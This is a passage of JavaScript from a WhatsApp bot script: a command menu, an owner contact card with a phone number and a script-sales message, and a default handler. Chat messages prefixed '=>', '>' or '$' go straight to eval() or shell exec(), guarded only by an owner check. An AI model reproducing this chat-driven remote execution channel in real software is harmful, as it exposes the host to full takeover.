│ ᴏᴡɴᴇʀ
│ ᴘɪɴɢ
│ ᴛᴏɪᴍᴀɢᴇ 
│ ᴛᴏᴠɪᴅᴇᴏ
│ ᴛᴏᴀᴜᴅɪᴏ 
│ ᴛᴏᴍᴘ3
│ ᴛᴏᴜʀʟ 
│ ᴛᴏǫʀ
│ ᴇᴍᴏᴊɪᴍɪx
╰─────────╯

╭──⟪ 𝘿𝙇𝙨 ⟫──╮
│ ғʙ 
│ ᴛᴛ 
│ ᴘʟᴀʏ
╰─────────╯
`
Usama.sendMessage(m.chat, {
  caption: menutext,
  video: { url: "https://files.catbox.moe/s3hql0.mp4" },
  gifPlayback: true
})
break

        
        case 'owner': 
    let contactVCard = `BEGIN:VCARD
VERSION:3.0
FN:ᡕᠵ᠊ᡃ່࡚ࠢ࠘⸝່ࠡ᠊߯ᡁࠣ࠘᠊᠊气亠υѕαмα
TEL;waid=923239601585:+923239601585
END:VCARD`;

    let contactMessage = {
        contacts: {
            displayName: "𝐔̸𝐒͙𝐀𝚳͟𝐀͎",
            contacts: [{ vcard: contactVCard }]
        }
    };

     let textMessage = {
        text: "𝙱𝚄𝚈 𝚂𝙲𝚁𝙸𝙿𝚃 𝗵𝗲𝗿𝗲!"
    };

    // Kirim kontak
    await Usama.sendMessage(m.chat, contactMessage, { quoted: m });

    // Kirim pesan teks setelahnya
    await Usama.sendMessage(m.chat, textMessage, { quoted: m });

break



            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return reply(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return reply(bang)
                    }
                    try {
                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await reply(evaled)
                    } catch (err) {
                        await reply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }
        }
    } catch (err) {
        Usama.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})